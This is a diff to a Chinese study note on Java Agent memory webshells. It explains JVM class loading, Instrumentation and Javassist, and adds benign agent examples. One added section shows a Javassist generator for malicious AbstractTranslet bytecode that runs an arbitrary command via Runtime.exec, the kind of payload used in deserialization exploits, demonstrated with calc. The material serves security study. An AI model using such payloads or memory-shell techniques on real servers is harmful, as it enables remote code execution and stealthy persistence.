@@ -14,6 +14,58 @@
 
 ---
 
+## 概述
+
+> [Agent 内存马的攻防之道 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/13110?time__1311=GqmhqUxfxRxIx05DKYYKehxjxo5D8C3WjeD&u_atoken=a8289602f4cac1b80c44ce039236b0bc&u_asig=0a472f9117303430519708908e0044)
+>
+> [rzte/agentcrack: 不那么一样的 Java Agent 内存马 (github.com)](https://github.com/rzte/agentcrack/)
+
+一般来说，java 内存马主要可以分为两种形式：
+
+- 创建如 controller、servlet、filter、valve 等 java web 组件，并通过如反射等形式进行注册或替换
+- 通过 java agent 技术，修改一些关键类 （如 servlet） 的代码
+
+这两种方式可以说各有优劣，对于第一种方式来说，虽然利用起来更为简单，但是需要依赖于具体组件，且由于注入的类位置比较明确且没有实体文件，所以比较容易检测出来。
+
+而 Agent 型内存马，其真正修改的类位置并不固定，且被修改的类并不是纯粹的“内存”类，相对来说检测起来会更复杂一些。而这方面的技术也越来越多，从一开始的落地 Jar 命令执行命令注入，到 Self Attach，再到无文件落地，借助 shellcode 的 Agent 注入。相关的技术实现也越来越精彩。
+
+---
+
+我们用 java agent 的目标就是修改一些关键类, 正常情况下，java agent 在 JVM 中有两种加载形式:
+
+- [Agent_OnLoad](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/instrument/InvocationAdapter.c#L144)：相当于 java 运行时，通过 `-javaagent` 参数加载指定的 `agent`。
+- [Agent_OnAttach](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/instrument/InvocationAdapter.c#L294)：通过 `VM.attach` 方法，向指定的 java 进程中，注入 `agent`。
+
+分析其代码会看到处理逻辑大同小异，主要流程就是创建 [JPLISAgent](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/instrument/JPLISAgent.h#L96) 以及 `java.lang.instrument.Instrumentation` 实例。然后调用 `agentMain` 或者 `preMain` 进行处理。
+
+我们注入的 `agent` 代码中所能拿到的 `InstrumentationImpl` 就是在上面的逻辑中创建的。
+
+而作为攻击方，我们往往会使用 `redefineClasses` 或者 `addTransform + retransform` 的方式，去修改类。要了解这两种方式分别是怎样修改的需要分析 jvm 中类的加载流程。了解了底层逻辑，才能在攻防之中占据主动地位。
+
+---
+
+## JVM 类加载流程
+
+> [Agent 内存马的攻防之道 - JVM 类加载流程 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/13110?time__1311=GqmhqUxfxRxIx05DKYYKehxjxo5D8C3WjeD&u_atoken=a8289602f4cac1b80c44ce039236b0bc&u_asig=0a472f9117303430519708908e0044)
+
+关于类的加载流程，可以从三个方面去入手：
+
+- 正常的类加载流程
+- 被 `redefineClasses` 后的类的加载流程
+- 被 `retransformClasses` 后的类的加载流程
+
+如下是 java 类的加载流程图（若图中有不准确的地方，欢迎指正），可结合图下面的文字阐述进行理解。
+
+![28012dcd30eb64bd04a065c04dd43200](http://cdn.ayusummer233.top/DailyNotes/202411041744623.png)
+
+- java 类在内存中是以 [InstanceKlass](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/oops/instanceKlass.hpp#L43) 的形式存在的，这个 `InstanceKlass` 中便包含了类中所定义的变量、方法等信息。
+
+  需要注意的是，当我们使用 java agent 技术时，虽然我们可以在 `ClassFileTransformer.transform` 中能拿到指定类的字节码，但内存中默认情况下其实是不会保存 java 类的原始字节码的。
+
+- 
+
+---
+
 ## Java Instrumentation
 
 > [Java Instrumentation | 素十八 (su18.org)](https://su18.org/post/irP0RsYK1/)
@@ -394,9 +446,220 @@ Java 字节码以二进制的形式存储在 .class 文件中，每一个.class�
 
 ---
 
+##### Javassist 示例-Intrumentation-Transformer-agentmain
+
+开一个 maven 项目写一个主类一个目标类
+
+```java
+// TargetClass.java
+package com.example.target;
+
+public class TargetClass {
+    public void targetMethod() {
+        System.out.println("原始方法执行");
+    }
+}
+```
+
+---
+
+```java
+// Main.java
+package com.example.target;
+
+public class Main {
+    public static void main(String[] args) {
+        TargetClass tc = new TargetClass();
+        tc.targetMethod();
+    }
+}
+```
+
+---
+
+```xml
+<!-- pom.xml -->
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0     http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.example</groupId>
+    <artifactId>target-app</artifactId>
+    <version>1.0-SNAPSHOT</version>
+    <packaging>jar</packaging>
+
+    <build>
+        <plugins>
+            <!-- Maven Shade Plugin，用于打包可执行的 JAR -->
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-shade-plugin</artifactId>
+                <version>3.2.4</version>
+                <executions>
+                    <execution>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>shade</goal>
+                        </goals>
+                        <configuration>
+                            <createDependencyReducedPom>false</createDependencyReducedPom>
+                            <transformers>
+                                <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+                                    <mainClass>com.example.target.Main</mainClass>
+                                </transformer>
+                            </transformers>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+</project>
+```
+
+----
+
+然后开一个 maven 项目写 Agent
+
+```java
+// Agent.java
+package com.summery233.agent;
+
+import java.lang.instrument.Instrumentation;
+
+public class Agent {
+    public static void premain(String agentArgs, Instrumentation inst) {
+        System.out.println("Agent 启动");
+        inst.addTransformer(new MyTransformer());
+    }
+}
+```
+
+---
+
+```java
+// MyTransformer.java
+package com.summery233.agent;
+
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+import javassist.*;
+import java.io.IOException;
+
+public class MyTransformer implements ClassFileTransformer {
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
+            ProtectionDomain protectionDomain, byte[] classfileBuffer)
+            throws IllegalClassFormatException {
+        // 转换类名格式：com/example/target/TargetClass -> com.example.target.TargetClass
+        String transformedClassName = className.replace('/', '.');
+        String targetClassName = "com.example.target.TargetClass";
+
+        if (transformedClassName.equals(targetClassName)) {
+            try {
+                // 获取默认的 ClassPool
+                ClassPool classPool = ClassPool.getDefault();
+                // 绑定当前线程的类加载器
+                classPool.appendClassPath(new LoaderClassPath(loader));
+
+                // 获取目标类
+                CtClass ctClass = classPool.get(targetClassName);
+
+                // 获取目标方法
+                CtMethod ctMethod = ctClass.getDeclaredMethod("targetMethod");
+
+                // 在方法开头插入代码
+                ctMethod.insertBefore("{ System.out.println(\"方法开始执行\"); }");
+
+                // 返回字节码
+                byte[] byteCode = ctClass.toBytecode();
+                ctClass.detach();
+                return byteCode;
+            } catch (NotFoundException | CannotCompileException | IOException e) {
+                e.printStackTrace();
+            }
+        }
+        // 返回 null 不修改字节码
+        return null;
+    }
+}
+```
+
+---
+
+```xml
+<!-- pom.xml -->
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0     http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.summery233</groupId>
+    <artifactId>agent</artifactId>
+    <version>1.0-SNAPSHOT</version>
+    <packaging>jar</packaging>
+
+    <dependencies>
+        <!-- 引入 Javassist 库 -->
+        <dependency>
+            <groupId>org.javassist</groupId>
+            <artifactId>javassist</artifactId>
+            <version>3.29.0-GA</version>
+        </dependency>
+    </dependencies>
+
+    <build>
+        <plugins>
+            <!-- Maven Shade Plugin，用于打包所有依赖并生成正确的 MANIFEST.MF -->
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-shade-plugin</artifactId>
+                <version>3.2.4</version>
+                <executions>
+                    <execution>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>shade</goal>
+                        </goals>
+                        <configuration>
+                            <!-- 打包所有依赖 -->
+                            <createDependencyReducedPom>false</createDependencyReducedPom>
+                            <transformers>
+                                <!-- 指定 Premain-Class -->
+                                <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+                                    <manifestEntries>
+                                        <Premain-Class>com.summery233.agent.Agent</Premain-Class>
+                                    </manifestEntries>
+                                </transformer>
+                            </transformers>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+</project>
+```
+
+---
+
+分别打包两个 maven 项目得到两个 jar
+
+![image-20241104095443587](http://cdn.ayusummer233.top/DailyNotes/202411040954942.png)
+
+```powershell
+java -javaagent:".\agent-1.0-SNAPSHOT.jar" -jar ".\target-app-1.0-SNAPSHOT.jar"
+```
+
+![image-20241104095748443](http://cdn.ayusummer233.top/DailyNotes/202411040957556.png)
+
+---
+
 ##### CtClass
 
-`CtClass` 是 Javassist 库中的一个类，表示 Java 类的字节码结构。它允许在运行时动态修改类的结构，例如添加或修改方法和字段。通过 `CtClass`，开发者可以实现类的增强和字节码操作。
+`CtClass` 是 Javassist 库中的一个类，表示 Java 类的字节码结构, 可以从 `ClassPool.get(ClassName)`中获取。它允许在运行时动态修改类的结构，例如添加或修改方法和字段。通过 `CtClass`，开发者可以实现类的增强和字节码操作。
 
 例如:
 
@@ -441,13 +704,313 @@ ClassPool cp = ClassPool.getDefault();
 
 **如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类**，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，**ClassPool 必须添加额外的类搜索路径**。
 
-```
+```java
 cp.insertClassPath(new ClassClassPath(<Class>));
 ```
 
+-----
 
+##### CtMethod
 
+同理，可以理解成加强版的`Method`对象。可通过`CtClass.getDeclaredMethod(MethodName)`获取，该类提供了一些方法以便我们能够直接修改方法体
 
+```java
+public final class CtMethod extends CtBehavior {
+    // 主要的内容都在父类 CtBehavior 中
+}
+ 
+// 父类 CtBehavior
+public abstract class CtBehavior extends CtMember {
+    // 设置方法体
+    public void setBody(String src);
+ 
+    // 插入在方法体最前面
+    public void insertBefore(String src);
+ 
+    // 插入在方法体最后面
+    public void insertAfter(String src);
+ 
+    // 在方法体的某一行插入内容
+    public int insertAt(int lineNum, String src);
+ 
+}
+```
+
+传递给方法 `insertBefore()` ，`insertAfter()` 和 `insertAt()` 的 String 对象**是由`Javassist` 的编译器编译的**。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202411041105314.png)
+
+---
+
+##### javassist示例-生成与写入类字节码
+
+```java
+package com.summery233;
+
+import java.lang.reflect.Modifier;
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import javassist.CtField;
+import javassist.CtMethod;
+import javassist.CtNewMethod;
+
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+public class Main {
+    public static void main(String[] args) {
+        System.out.println("Hello world!");
+        try {
+            Create_Person();
+        } catch (Exception e) {
+            System.out.println("使用javassist创建类失败,报错如下:");
+            e.printStackTrace();
+        }
+    }
+
+    public static void Create_Person() throws Exception {
+
+        // 获取 CtClass 对象的容器 ClassPool
+        ClassPool classPool = ClassPool.getDefault();
+
+        // 创建一个新类 Javassist.Learning.Person
+        CtClass ctClass = classPool.makeClass("javassist.Person");
+
+        // 创建一个类属性 name
+        CtField ctField1 = new CtField(classPool.get("java.lang.String"), "name", ctClass);
+        // 设置属性访问符
+        ctField1.setModifiers(Modifier.PRIVATE);
+        // 将 name 属性添加进 Person 中，并设置初始值为 Drunkbaby
+        ctClass.addField(ctField1, CtField.Initializer.constant("Drunkbaby"));
+
+        // 向 Person 类中添加 setter 和 getter
+        ctClass.addMethod(CtNewMethod.setter("setName", ctField1));
+        ctClass.addMethod(CtNewMethod.getter("getName", ctField1));
+
+        // 创建一个无参构造
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, ctClass);
+        // 设置方法体
+        ctConstructor.setBody("{name = \"Drunkbaby\";}");
+        // 向Person类中添加无参构造
+        ctClass.addConstructor(ctConstructor);
+
+        // 创建一个类方法printName
+        CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[] {}, ctClass);
+        // 设置方法访问符
+        ctMethod.setModifiers(Modifier.PRIVATE);
+        // 设置方法体
+        ctMethod.setBody("{System.out.println(name);}");
+        // 将该方法添加进Person中
+        ctClass.addMethod(ctMethod);
+
+        ctClass.writeFile("out"); 
+    }
+
+}
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.summery233</groupId>
+    <artifactId>javassist-create-class</artifactId>
+    <version>1.0-SNAPSHOT</version>
+
+    <properties>
+        <maven.compiler.source>17</maven.compiler.source>
+        <maven.compiler.target>17</maven.compiler.target>
+    </properties>
+
+    <dependencies>
+        <dependency>
+            <groupId>org.javassist</groupId>
+            <artifactId>javassist</artifactId>
+            <version>3.27.0-GA</version>
+        </dependency>
+    </dependencies>
+</project>
+```
+
+运行程序会在当前项目目录下生成 `out/javassist`
+
+![image-20241104151530154](http://cdn.ayusummer233.top/DailyNotes/202411041515500.png)
+
+---
+
+##### 使用 javassist 生成恶意 class
+
+在如下场景中, 我们的恶意类需要继承`AbstractTranslet`类，并重写两个`transform()`方法。否则编译无法通过，无法生成`.class`文件。
+
+- `AbstractTranslet` 是 Apache Xalan 库中的一个抽象类，Xalan 是一个用于处理 XSLT 转换的库。改类提供了一些基础设施，用于在 XSLT 转换过程中执行特定的操作。
+- 在生成恶意类时，重写 `transform()` 方法可以插入恶意代码，使得在调用这些方法时执行攻击者指定的恶意操作。
+- 如果不重写这些方法，编译器会认为类没有实现抽象方法，从而导致编译错误，无法生成有效的 `.class` 文件。
+
+```java
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+ 
+public class shell extends AbstractTranslet {
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+    }
+ 
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+    }
+ 
+    public shell() throws IOException {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (Exception var2) {
+            var2.printStackTrace();
+        }
+    }
+}
+```
+
+但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。代码如下。
+
+```java
+package javassist;  
+  
+import java.io.File;  
+import java.io.FileOutputStream;  
+  
+public class EvilPayload {  
+  
+    public static byte[] getTemplatesImpl(String cmd) {  
+        try {  
+            ClassPool pool = ClassPool.getDefault();  
+            CtClass ctClass = pool.makeClass("Evil");  
+            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
+            ctClass.setSuperclass(superClass);  
+            CtConstructor constructor = ctClass.makeClassInitializer();  
+            constructor.setBody(" try {\n" +  
+                    " Runtime.getRuntime().exec(\"" + cmd +  
+                    "\");\n" +  
+                    " } catch (Exception ignored) {\n" +  
+                    " }");  
+            byte[] bytes = ctClass.toBytecode();  
+            ctClass.defrost();  
+            return bytes;  
+        } catch (Exception e) {  
+            e.printStackTrace();  
+            return new byte[]{};  
+        }  
+    }  
+  
+  
+    public static void writeShell() throws Exception {  
+        byte[] shell = EvilPayload.getTemplatesImpl("Calc");  
+        FileOutputStream fileOutputStream = new FileOutputStream(new File("S"));  
+        fileOutputStream.write(shell);  
+    }  
+  
+    public static void main(String[] args) throws Exception {  
+        writeShell();  
+    }  
+}
+```
+
+生成的恶意文件被我们输出到了 `S` 这个文件中，其实很多反序列化在用的时候，是没有把这个字节码提取保存出来，本质上还是可以保存的。
+
+保存出来的文件代码如下
+
+```java
+//  
+// Source code recreated from a .class file by IntelliJ IDEA  
+// (powered by FernFlower decompiler)  
+//  
+  
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
+  
+public class Evil extends AbstractTranslet {  
+    static {  
+        try {  
+            Runtime.getRuntime().exec("Calc");  
+        } catch (Exception var1) {  
+        }  
+  
+    }  
+  
+    public Evil() {  
+    }  
+}
+```
+
+---
+
+#### Instrumentation
+
+Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。
+
+其在 Java 中是一个接口，常用方法如下
+
+```java
+public interface Instrumentation {
+    
+    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
+    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
+ 
+    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
+    void addTransformer(ClassFileTransformer transformer);
+ 
+    //删除一个类转换器
+    boolean removeTransformer(ClassFileTransformer transformer);
+ 
+ 
+    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
+    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
+ 
+ 
+ 
+    //判断一个类是否被修改
+    boolean isModifiableClass(Class<?> theClass);
+ 
+    // 获取目标已经加载的类。
+    @SuppressWarnings("rawtypes")
+    Class[] getAllLoadedClasses();
+ 
+    //获取一个对象的大小
+    long getObjectSize(Object objectToSize);
+ 
+}
+```
+
+----
+
+##### ClassFileTransformer
+
+转换类文件，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。
+
+```java
+//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  
+void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
+```
+
+---
+
+### Instrumentation的局限性
+
+> [Java Agent 内存马学习-几种Java Agent 实例-Instrumentation的局限性 | Drunkbaby's Blog (drun1baby.top)](https://drun1baby.top/2023/12/07/Java-Agent-内存马学习/#Instrumentation-的局限性)
+
+大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：
+
+- `	premain 和 agentmain 两种方式**修改字节码**的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。
+
+- 类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 `Instrumentation#redefineClasses` 方法，此方法有以下限制：
+  - 新类和老类的父类必须相同
+  - 新类和老类实现的接口数也要相同，并且是相同的接口
+  - 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致
+  - 新类和老类新增或删除的方法必须是 private static/final 修饰的
+  - 可以修改方法体
 
 ---
 
@@ -494,6 +1057,9 @@ agent 端在 `net/rebeyond/behinder/resource/tools` 中，应该是根据不同�
 - [OneTab - Shared tabs (one-tab.com)](https://www.one-tab.com/page/K2Av-humTrKqGh6Y2QLoUQ)
 - [OneTab - Shared tabs (one-tab.com)](https://www.one-tab.com/page/Gk-1RtX6TY-HXIDxT-u7RA)
 - [03.Java Agent 内存马 · d4m1ts 知识库 (gm7.org)](https://blog.gm7.org/个人知识库/02.代码审计/01.java安全/05.内存马/03.Java Agent 内存马.html)
+  - Spring Java Agent 内存马
+    - [Java Agent 内存马学习 | Drunkbaby's Blog (drun1baby.top)](https://drun1baby.top/2023/12/07/Java-Agent-内存马学习/#Agent-内存马实战)
+
 
 ---
 
